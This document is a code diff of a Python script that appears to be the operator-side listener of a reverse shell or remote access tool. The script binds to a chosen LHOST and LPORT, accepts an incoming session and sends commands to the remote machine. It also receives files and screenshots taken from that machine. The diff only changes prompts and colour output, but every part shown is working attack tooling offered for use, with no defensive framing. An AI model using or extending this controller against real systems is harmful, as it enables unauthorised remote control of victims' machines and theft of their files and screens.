@@ -5,7 +5,6 @@ import subprocess
 import sys
 import os
 import time
-import netifaces as ni
 import signal
 import readline
 import pickle
@@ -23,14 +22,12 @@ RED = '\33[31m'
 YELLOW = '\33[33m'
 CYAN = '\033[1;36m'
 END = '\33[0m'
+BOLD = '\33[1m'
 CURL = '\33[4m'
 
-createS = (GREEN + '[*] Attempting to create socket... ' + END)
-success = (GREEN + '[*] Success! ' + END)
-restarting = (YELLOW + '\n[!] Trying to restart... ' + END)
-restartTerminal = (YELLOW + '[!] Sometimes restarting the terminal may help... ' + END)
-bindS = (GREEN + '[*] Binding socket to port...' + END)
-failed = (RED + '[!] Failed!' + END)
+restarting = (YELLOW + BOLD + '\n[!] Trying to restart... ' + END)
+restartTerminal = (YELLOW + BOLD + '[!] Sometimes restarting the terminal may help... ' + END)
+failed = (RED + BOLD + '[!] Failed!' + END)
 
 def signal_handler(sig, frame):
     print(RED + '\n\nQuitting...\n' + END)
@@ -38,78 +35,41 @@ def signal_handler(sig, frame):
 
 def socketCreate():
     try:
-        time.sleep(0.5)
-        global neti
-        global ip
         global host
         global port
         global showPort
         global s
-        try:
-            # ASK FOR AND SET NETWORK INTERFACE
-            netI = input(GREEN + '[*] Input you prefered network interface. (Press enter for wlan0): ' + END)
-            if netI == '':
-                netI = 'wlan0'
-            print(GREEN + '[*] Using network interaces ' + END + CYAN + netI + END)
-        except:
-            print(RED + '[!] Incorrect network interface!' + END)
-            sys.exit(1)
-            
-        try:
-            # ASK FOR AND SET IP ADDRESS
-            ni.ifaddresses(netI)
-            ip = ni.ifaddresses(netI)[ni.AF_INET][0]['addr']
-            host = input(GREEN + '[*] Choose connect bask address (Press enter for ' + ip + '): ' + END)
-            if host == '':
-                host = ip
-            print(GREEN + '[*] Using IP ' + END + CYAN + host + END)
-        except:
-            print(RED + '[!] There was an error getting the IP address. Try checking your network interface.' + END)
-            sys.exit(1)
-        try:
-           # ASK FOR AND SET PORT
-           port = input(GREEN + '[*] Input the connect back port (Press enter for 4444): ' + END)
-           if port == '':
-               port = '4444'
-           print(GREEN + '[*] Using port ' + END + CYAN + port + END)
-           port = int(port)
-           showPort = str(port)
-        except:
-            print(RED + '[!] There was an unknown error creating to port!' + END)
-            sys.exit(1)
 
-        print(createS)
+        host = input(GREEN + BOLD + 'Set LHOST IP: ' + END)
+        port = input('\n' + GREEN + BOLD + 'SET LPORT: ' + END)
+
+        port = int(port)
+        showPort = str(port)
+
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        time.sleep(0.5)
-        print(success)
     except socket.error:
         print(failed)
 
 def socketBind():
     try:
-        time.sleep(0.5)
-        print(bindS)
-        time.sleep(0.5)
         s.bind((host, port))
-        print(success)
     except socket.error:
         print(failed)
         print(restarting)
         print(restartTerminal)
-        time.sleep(1)
         subprocess.call(['clear'])
         socketBind()
 
 def listening():
     s.listen(1)
-    print(GREEN + '\n[*] Listening on ' + END + CYAN + ip + ':' + showPort + END)
+    print(GREEN + BOLD + '\n[*] Listening on ' + END + CYAN + host + ':' + showPort + END)
 
 def socketAccept():
     global conn
     global addr
 
     conn, addr, = s.accept()
-    print(GREEN + '\n[*] Session opened at ' + END + CYAN + addr[0] + ':' + str(addr[1]) + '\n' + END)
+    print(GREEN + BOLD + '\n[*] Session opened at ' + END + CYAN + addr[0] + ':' + str(addr[1]) + '\n' + END)
 
     sendCommands(conn)
 
@@ -186,10 +146,10 @@ def sendCommands(conn):
                 filename = input('\n' + CYAN + '[*] Please enter a filename for the incoming file: ' + END + GREEN)
                 file = open('downloads/' + filename, 'wb')
                 file_data = conn.recv(1024)
-                print(GREEN + '\n' + '[*] Downloading...' + END)
+                print(GREEN + BOLD + '\n' + '[*] Downloading...' + END)
                 file.write(file_data)
                 file.close()
-                print(GREEN + '[*] Downloaded successfully to downloads/' + filename + END)
+                print(GREEN + BOLD + '[*] Downloaded successfully to downloads/' + filename + END)
             except:
                 print(RED + '[!] There was an error downloading your file.' + END)
                 pass
@@ -199,7 +159,7 @@ def sendCommands(conn):
             print('\n' + clientResponse, end='')
         elif cmd == 'download -s':
             print('                 ')
-            print(GREEN + '[*] Transfering screenshot... This can take up to 20 seconds...' + END)
+            print(GREEN + BOLD + '[*] Transfering screenshot... This can take up to 20 seconds...' + END)
             conn.send(str.encode(cmd))
             data = b""
             payload_size = struct.calcsize(">L")
